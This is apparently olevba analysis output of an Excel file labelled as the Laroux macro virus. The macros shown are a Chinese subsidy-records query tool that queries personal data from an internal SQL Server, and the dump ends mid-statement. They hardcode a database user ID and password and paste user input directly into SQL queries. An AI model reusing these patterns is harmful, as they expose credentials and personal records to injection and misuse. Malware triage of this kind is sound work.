olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 模块2.bas 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/模块2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim hhh    '定义模块级变量
Sub auto_open()
    On Error Resume Next
    Dim mymenu As String, myrun As String, mynum As Integer
    Dim n As Integer, i As Integer
    n = 9  '假设有9个命令按钮
    ReDim 命令(1 To n) As String, 宏(1 To n) As String
    命令(1) = "查询全部数据": 宏(1) = "查询全部数据"
    命令(2) = "查询有帐号数据": 宏(2) = "查询有帐号数据"
    命令(3) = "查询无帐号数据": 宏(3) = "查询无帐号数据"
    命令(4) = "查询身份证号重复的数据": 宏(4) = "查询身份证号重复的数据"
    命令(5) = "二代身份证国标检验": 宏(5) = "二代身份证国标检验"
    命令(6) = "自动填写性别": 宏(6) = "自动填写性别"
    命令(7) = "自动填写开户银行": 宏(7) = "自动填写开户银行"
    命令(8) = "自动填写家庭住址": 宏(8) = "自动填写家庭住址"
    命令(9) = "审核": 宏(9) = "审核"
    
       CommandBars("Worksheet Menu Bar").Controls("补贴对象基本信息查询").Delete
    Set hhh = CommandBars("Worksheet Menu Bar").Controls.Add _
             (Type:=msoControlPopup, before:=11)
    hhh.Caption = "补贴对象基本信息查询"
    '开始在自定义菜单"销售管理系统"中添加各个命令按钮，并指定相应的宏
    For i = 1 To n
        Call 添加命令(命令(i), i, 宏(i))
    Next i
End Sub

Public Sub 添加命令(mymenu As String, mynum As Integer, myrun As String)
    With hhh.Controls.Add(Type:=msoControlButton, before:=mynum)
        .Caption = mymenu
        .OnAction = myrun
    End With
End Sub
Sub auto_close()
    On Error Resume Next
    CommandBars("Worksheet Menu Bar").Controls("补贴对象基本信息查询").Delete
End Sub

-------------------------------------------------------------------------------
VBA MACRO 模块1.bas 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/模块1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub 查询全部数据()
    Dim cnn As New ADODB.Connection
    Dim rs As New ADODB.Recordset
    Dim ws As Worksheet
    Dim SQL As String, mydata As String, mytable As String
    Dim i As Long, j As Long
    Set ws = ThisWorkbook.ActiveSheet    '指定要复制查询数据的工作表
    ActiveSheet.EnableSelection = xlUnlockedCells
    ActiveSheet.Unprotect
     Cells.Select    '去除工作表保护
    Selection.ClearContents   '清除工作表的所有数据
    mydata = "fimp"      '指定数据库
    mytable = "t_sn_object"     '指定数据表
    dwdmxx = InputBox("请输入单位代码（长度为9位）", "单位代码", "")
        '建立与SQL Server数据库服务器上指定数据库的连接
    cnn.ConnectionString = "Provider=SQLOLEDB;" _
        & "User ID=hnxc;" _
        & "Password=hnxchnxc;" _
        & "Data Source=10.105.135.9;" _
        & " Initial Catalog=" & mydata
    cnn.Open
    '执行SQL语句创建指定数据表的查询记录集
    SQL = "select object_code,object_name,sex,idcard_num,home_address,postcode,phone,member_num,outhomepeople,athomepeople,bankname,enable from fimp.hnxc.t_sn_object where object_code like " & "'" & dwdmxx & "%'" & " ORDER BY OBJECT_CODE"
    Set rs = cnn.Execute(SQL)
    '复制字段名
    For i = 0 To rs.Fields.Count - 1
        ws.Cells(1, i + 1) = rs.Fields(i).Name
        ws.Cells(1, i + 1).Font.Bold = True
    Next i
    '复制全部记录数据
    ws.Range("A2").CopyFromRecordset rs
    '字段设置列宽至合适的宽度
    ws.Columns.AutoFit
    '关机记录集以及与数据库的连接
    rs.Close
    cnn.Close
    Set rs = Nothing
    Set cnn = Nothing
    Set ws = Nothing
   Range("A1").Select
    ActiveCell.FormulaR1C1 = "对象代码"
    Range("B1").Select
    ActiveCell.FormulaR1C1 = "对象姓名"
    Range("C1").Select
    ActiveCell.FormulaR1C1 = "性别"
    Range("D1").Select
    ActiveCell.FormulaR1C1 = "身份证号"
    Range("E1").Select
    ActiveCell.FormulaR1C1 = "地址"
    Range("F1").Select
    ActiveCell.FormulaR1C1 = "邮政编码"
    Range("G1").Select
     ActiveCell.FormulaR1C1 = "电话"
    Range("H1").Select
    ActiveCell.FormulaR1C1 = "家庭人口"
    Range("I1").Select
    ActiveCell.FormulaR1C1 = "处出务工劳动力数"
    Range("J1").Select
    ActiveCell.FormulaR1C1 = "在家务农劳动力数"
    Range("K1").Select
    ActiveCell.FormulaR1C1 = "开户银行"
    Range("L1").Select
    ActiveCell.FormulaR1C1 = "启用状态"
     Columns("l:l").Select
    Selection.Replace What:="TRUE", Replacement:="启用", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="FALSE", Replacement:="已注销", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
        
    Columns("B:B").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入姓名"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象姓名，姓名应由汉字组成，不得包含空格、数字、括号等任何非汉字符号。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("D:D").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入身份证号"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象的二代身份证号。二代身份证号长度为18位，前6位为行政区划码，接下来8位为持证人出生时间，倒数第二位表示对象性别，奇数代表男性，偶数代表女性。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("E:E").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象地址"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象地址。一般应录入对象居住址，也可能录入行政区划所在地，可以用工具中的自动填写功能批量填写补贴所在地的行政区划地址，但应用此工具时会自动将所有对象的地址重写且不可恢复。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("F:F").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象邮政编码"
        .ErrorTitle = ""
        .InputMessage = "此处填写邮政编码，澧县的邮政编码为4155XX。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("G:G").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象联系电话"
        .ErrorTitle = ""
        .InputMessage = _
        "此处填写补贴对象联系电话，一般要填写本人的座机电话号码或手机电话号码，如本人没有联系电话的，也可以填写村、组电话号码或其他可以联系到补贴对象的电话号码。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("H:H").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入家庭人口数"
        .ErrorTitle = ""
        .InputMessage = "此处填写补贴对象家庭人口数。家庭人口数应为大于0的整数，且不得小于外出务工劳动力数与在家务农劳动力数之和。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("I:I").Select
    ActiveCell.FormulaR1C1 = "处出务工劳动力数"
    Columns("I:I").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入外出务工劳动力数"
        .ErrorTitle = ""
        .InputMessage = "此处填写补贴对象家庭中常年在外劳动力数，偶尔外出打短工的不在此列。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("J:J").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入在家务农劳动力数"
        .ErrorTitle = ""
        .InputMessage = "此处填写在家务农劳动力数。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("K:K").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入开户银行名称"
        .ErrorTitle = ""
        .InputMessage = "些处填写开户银行名称，澧县全部在邮政银行开户，可以用工具提供的自动填写开户银行命令批量填写。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    
    Range("A1").Select
     'Cells.Select
    'Selection.Locked = False
   ' Selection.FormulaHidden = False
   ' Columns("A:A").Select
   ' Selection.Locked = True
   ' Selection.FormulaHidden = False
   ' Range("A1").Select
   ' ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
   '     False, AllowFormattingColumns:=True, AllowFormattingRows:=True, _
   '     AllowSorting:=True, AllowFiltering:=True
        '保护工作表
        
End Sub



Public Sub 查询有帐号数据()
    Dim cnn As New ADODB.Connection
    Dim rs As New ADODB.Recordset
    Dim ws As Worksheet
    Dim SQL As String, mydata As String, mytable As String
    Dim i As Long, j As Long
    Set ws = ThisWorkbook.ActiveSheet    '指定要复制查询数据的工作表
    ActiveSheet.EnableSelection = xlUnlockedCells
    ActiveSheet.Unprotect
    ws.Cells.Clear    '清除工作表的所有数据
    mydata = "fimp"      '指定数据库
    mytable = "t_sn_object"     '指定数据表
    dwdmxx = InputBox("请输入乡镇代码（长度为9位）", "单位代码", "")
        '建立与SQL Server数据库服务器上指定数据库的连接
    cnn.ConnectionString = "Provider=SQLOLEDB;" _
        & "User ID=hnxc;" _
        & "Password=hnxchnxc;" _
        & "Data Source=10.105.135.9;" _
        & " Initial Catalog=" & mydata
    cnn.Open
    '执行SQL语句创建指定数据表的查询记录集
    SQL = "select object_code,object_name,sex,idcard_num,home_address,postcode,phone,member_num,outhomepeople,athomepeople,bankname,enable,yhzh from fimp.hnxc.t_sn_object a,fimp.hnxc.t_sn_object_zhxx b where a.id=b.btdx_uid and qybz=1 and object_code like " & "'" & dwdmxx & "%'" & " ORDER BY OBJECT_CODE"
    Set rs = cnn.Execute(SQL)
    '复制字段名
    For i = 0 To rs.Fields.Count - 1
        ws.Cells(1, i + 1) = rs.Fields(i).Name
        ws.Cells(1, i + 1).Font.Bold = True
    Next i
    '复制全部记录数据
    ws.Range("A2").CopyFromRecordset rs
    '字段设置列宽至合适的宽度
    ws.Columns.AutoFit
    '关机记录集以及与数据库的连接
    rs.Close
    cnn.Close
    Set rs = Nothing
    Set cnn = Nothing
    Set ws = Nothing
    Range("A1").Select
    ActiveCell.FormulaR1C1 = "对象代码"
    Range("B1").Select
    ActiveCell.FormulaR1C1 = "对象姓名"
    Range("C1").Select
    ActiveCell.FormulaR1C1 = "性别"
    Range("D1").Select
    ActiveCell.FormulaR1C1 = "身份证号"
    Range("E1").Select
    ActiveCell.FormulaR1C1 = "地址"
    Range("F1").Select
    ActiveCell.FormulaR1C1 = "邮政编码"
    Range("G1").Select
     ActiveCell.FormulaR1C1 = "电话"
    Range("H1").Select
    ActiveCell.FormulaR1C1 = "家庭人口"
    Range("I1").Select
    ActiveCell.FormulaR1C1 = "处出务工劳动力数"
    Range("J1").Select
    ActiveCell.FormulaR1C1 = "在家务农劳动力数"
    Range("K1").Select
    ActiveCell.FormulaR1C1 = "开户银行"
    Range("L1").Select
    ActiveCell.FormulaR1C1 = "启用状态"
    Range("M1").Select
    ActiveCell.FormulaR1C1 = "帐号"
     Columns("l:l").Select
    Selection.Replace What:="TRUE", Replacement:="启用", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="FALSE", Replacement:="已注销", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
        
        Columns("B:B").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入姓名"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象姓名，姓名应由汉字组成，不得包含空格、数字、括号等任何非汉字符号。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("D:D").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入身份证号"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象的二代身份证号。二代身份证号长度为18位，前6位为行政区划码，接下来8位为持证人出生时间，倒数第二位表示对象性别，奇数代表男性，偶数代表女性。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("E:E").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象地址"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象地址。一般应录入对象居住址，也可能录入行政区划所在地，可以用工具中的自动填写功能批量填写补贴所在地的行政区划地址，但应用此工具时会自动将所有对象的地址重写且不可恢复。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("F:F").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象邮政编码"
        .ErrorTitle = ""
        .InputMessage = "此处填写邮政编码，澧县的邮政编码为4155XX。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("G:G").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象联系电话"
        .ErrorTitle = ""
        .InputMessage = _
        "此处填写补贴对象联系电话，一般要填写本人的座机电话号码或手机电话号码，如本人没有联系电话的，也可以填写村、组电话号码或其他可以联系到补贴对象的电话号码。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("H:H").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入家庭人口数"
        .ErrorTitle = ""
        .InputMessage = "此处填写补贴对象家庭人口数。家庭人口数应为大于0的整数，且不得小于外出务工劳动力数与在家务农劳动力数之和。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("I:I").Select
    ActiveCell.FormulaR1C1 = "处出务工劳动力数"
    Columns("I:I").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入外出务工劳动力数"
        .ErrorTitle = ""
        .InputMessage = "此处填写补贴对象家庭中常年在外劳动力数，偶尔外出打短工的不在此列。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("J:J").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入在家务农劳动力数"
        .ErrorTitle = ""
        .InputMessage = "此处填写在家务农劳动力数。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("K:K").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入开户银行名称"
        .ErrorTitle = ""
        .InputMessage = "些处填写开户银行名称，澧县全部在邮政银行开户，可以用工具提供的自动填写开户银行命令批量填写。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    
    
    Range("A1").Select
   '  Cells.Select
   ' Selection.Locked = False
   ' Selection.FormulaHidden = False
   ' Columns("A:A").Select
   ' Selection.Locked = True
   ' Selection.FormulaHidden = False
   ' Range("A1").Select
   ' ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
   '     False, AllowFormattingColumns:=True, AllowFormattingRows:=True, _
   '     AllowSorting:=True, AllowFiltering:=True
End Sub

Public Sub 查询无帐号数据()
    Dim cnn As New ADODB.Connection
    Dim rs As New ADODB.Recordset
    Dim ws As Worksheet
    Dim SQL As String, mydata As String, mytable As String
    Dim i As Long, j As Long
    Set ws = ThisWorkbook.ActiveSheet    '指定要复制查询数据的工作表
    ActiveSheet.EnableSelection = xlUnlockedCells
    ActiveSheet.Unprotect
    ws.Cells.Clear    '清除工作表的所有数据
    mydata = "fimp"      '指定数据库
    mytable = "t_sn_object"     '指定数据表
    dwdmxx = InputBox("请输入乡镇代码（长度为9位）", "单位代码", "")
        '建立与SQL Server数据库服务器上指定数据库的连接
    cnn.ConnectionString = "Provider=SQLOLEDB;" _
        & "User ID=hnxc;" _
        & "Password=hnxchnxc;" _
        & "Data Source=10.105.135.9;" _
        & " Initial Catalog=" & mydata
    cnn.Open
    '执行SQL语句创建指定数据表的查询记录集
    SQL = "select object_code,object_name,sex,idcard_num,home_address,postcode,phone,member_num,outhomepeople,athomepeople,bankname,enable from fimp.hnxc.t_sn_object  where id not in (select btdx_uid from fimp.hnxc.t_sn_object_zhxx where qybz=1) and object_code like " & "'" & dwdmxx & "%'" & " ORDER BY OBJECT_CODE"
    Set rs = cnn.Execute(SQL)
    '复制字段名
    For i = 0 To rs.Fields.Count - 1
        ws.Cells(1, i + 1) = rs.Fields(i).Name
        ws.Cells(1, i + 1).Font.Bold = True
    Next i
    '复制全部记录数据
    ws.Range("A2").CopyFromRecordset rs
    '字段设置列宽至合适的宽度
    ws.Columns.AutoFit
    '关机记录集以及与数据库的连接
    rs.Close
    cnn.Close
    Set rs = Nothing
    Set cnn = Nothing
    Set ws = Nothing
    Range("A1").Select
    ActiveCell.FormulaR1C1 = "对象代码"
    Range("B1").Select
    ActiveCell.FormulaR1C1 = "对象姓名"
    Range("C1").Select
    ActiveCell.FormulaR1C1 = "性别"
    Range("D1").Select
    ActiveCell.FormulaR1C1 = "身份证号"
    Range("E1").Select
    ActiveCell.FormulaR1C1 = "地址"
    Range("F1").Select
    ActiveCell.FormulaR1C1 = "邮政编码"
    Range("G1").Select
     ActiveCell.FormulaR1C1 = "电话"
    Range("H1").Select
    ActiveCell.FormulaR1C1 = "家庭人口"
    Range("I1").Select
    ActiveCell.FormulaR1C1 = "处出务工劳动力数"
    Range("J1").Select
    ActiveCell.FormulaR1C1 = "在家务农劳动力数"
    Range("K1").Select
    ActiveCell.FormulaR1C1 = "开户银行"
    Range("L1").Select
    ActiveCell.FormulaR1C1 = "启用状态"
    Columns("l:l").Select
    Selection.Replace What:="TRUE", Replacement:="启用", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="FALSE", Replacement:="已注销", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
        
        Columns("B:B").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入姓名"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象姓名，姓名应由汉字组成，不得包含空格、数字、括号等任何非汉字符号。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("D:D").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入身份证号"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象的二代身份证号。二代身份证号长度为18位，前6位为行政区划码，接下来8位为持证人出生时间，倒数第二位表示对象性别，奇数代表男性，偶数代表女性。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("E:E").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象地址"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象地址。一般应录入对象居住址，也可能录入行政区划所在地，可以用工具中的自动填写功能批量填写补贴所在地的行政区划地址，但应用此工具时会自动将所有对象的地址重写且不可恢复。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("F:F").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象邮政编码"
        .ErrorTitle = ""
        .InputMessage = "此处填写邮政编码，澧县的邮政编码为4155XX。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("G:G").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象联系电话"
        .ErrorTitle = ""
        .InputMessage = _
        "此处填写补贴对象联系电话，一般要填写本人的座机电话号码或手机电话号码，如本人没有联系电话的，也可以填写村、组电话号码或其他可以联系到补贴对象的电话号码。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("H:H").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入家庭人口数"
        .ErrorTitle = ""
        .InputMessage = "此处填写补贴对象家庭人口数。家庭人口数应为大于0的整数，且不得小于外出务工劳动力数与在家务农劳动力数之和。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("I:I").Select
    ActiveCell.FormulaR1C1 = "处出务工劳动力数"
    Columns("I:I").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入外出务工劳动力数"
        .ErrorTitle = ""
        .InputMessage = "此处填写补贴对象家庭中常年在外劳动力数，偶尔外出打短工的不在此列。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("J:J").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入在家务农劳动力数"
        .ErrorTitle = ""
        .InputMessage = "此处填写在家务农劳动力数。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("K:K").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入开户银行名称"
        .ErrorTitle = ""
        .InputMessage = "些处填写开户银行名称，澧县全部在邮政银行开户，可以用工具提供的自动填写开户银行命令批量填写。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    
    
    Range("A1").Select
    ' Cells.Select
    'Selection.Locked = False
    'Selection.FormulaHidden = False
    'Columns("A:A").Select
    'Selection.Locked = True
    'Selection.FormulaHidden = False
    'Range("A1").Select
    'ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
    '    False, AllowFormattingColumns:=True, AllowFormattingRows:=True, _
    '    AllowSorting:=True, AllowFiltering:=True
    End Sub
Public Sub 查询身份证号重复的数据()
    Dim cnn As New ADODB.Connection
    Dim rs As New ADODB.Recordset
    Dim ws As Worksheet
    Dim SQL As String, mydata As String, mytable As String
    Dim i As Long, j As Long
    Set ws = ThisWorkbook.ActiveSheet    '指定要复制查询数据的工作表
    ActiveSheet.EnableSelection = xlUnlockedCells
    ActiveSheet.Unprotect
    ws.Cells.Clear    '清除工作表的所有数据
    mydata = "fimp"      '指定数据库
    mytable = "t_sn_object"     '指定数据表
    'dwdmxx = InputBox("请输入乡镇代码（长度为9位）", "单位代码", "")
        '建立与SQL Server数据库服务器上指定数据库的连接
    cnn.ConnectionString = "Provider=SQLOLEDB;" _
        & "User ID=hnxc;" _
        & "Password=hnxchnxc;" _
        & "Data Source=10.105.135.9;" _
        & " Initial Catalog=" & mydata
    cnn.Open
    '执行SQL语句创建指定数据表的查询记录集
    SQL = "select object_code,object_name,sex,idcard_num,home_address,postcode,phone,member_num,outhomepeople,athomepeople,bankname,enable from fimp.hnxc.t_sn_object  where idcard_num in (SELECT IDCARD_NUM FROM FIMP.HNXC.T_SN_OBJECT WHERE  (IDCARD_NUM IS NOT NULL AND IDCARD_NUM<>'') GROUP BY IDCARD_NUM HAVING COUNT(1)>1) ORDER BY IDCARD_NUM"
    Set rs = cnn.Execute(SQL)
    '复制字段名
    For i = 0 To rs.Fields.Count - 1
        ws.Cells(1, i + 1) = rs.Fields(i).Name
        ws.Cells(1, i + 1).Font.Bold = True
    Next i
    '复制全部记录数据
    ws.Range("A2").CopyFromRecordset rs
    '字段设置列宽至合适的宽度
    ws.Columns.AutoFit
    '关机记录集以及与数据库的连接
    rs.Close
    cnn.Close
    Set rs = Nothing
    Set cnn = Nothing
    Set ws = Nothing
    Range("A1").Select
    ActiveCell.FormulaR1C1 = "对象代码"
    Range("B1").Select
    ActiveCell.FormulaR1C1 = "对象姓名"
    Range("C1").Select
    ActiveCell.FormulaR1C1 = "性别"
    Range("D1").Select
    ActiveCell.FormulaR1C1 = "身份证号"
    Range("E1").Select
    ActiveCell.FormulaR1C1 = "地址"
    Range("F1").Select
    ActiveCell.FormulaR1C1 = "邮政编码"
    Range("G1").Select
     ActiveCell.FormulaR1C1 = "电话"
    Range("H1").Select
    ActiveCell.FormulaR1C1 = "家庭人口"
    Range("I1").Select
    ActiveCell.FormulaR1C1 = "处出务工劳动力数"
    Range("J1").Select
    ActiveCell.FormulaR1C1 = "在家务农劳动力数"
    Range("K1").Select
    ActiveCell.FormulaR1C1 = "开户银行"
    Range("L1").Select
    ActiveCell.FormulaR1C1 = "启用状态"
    Columns("l:l").Select
    Selection.Replace What:="TRUE", Replacement:="启用", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="FALSE", Replacement:="已注销", LookAt:=xlPart, _
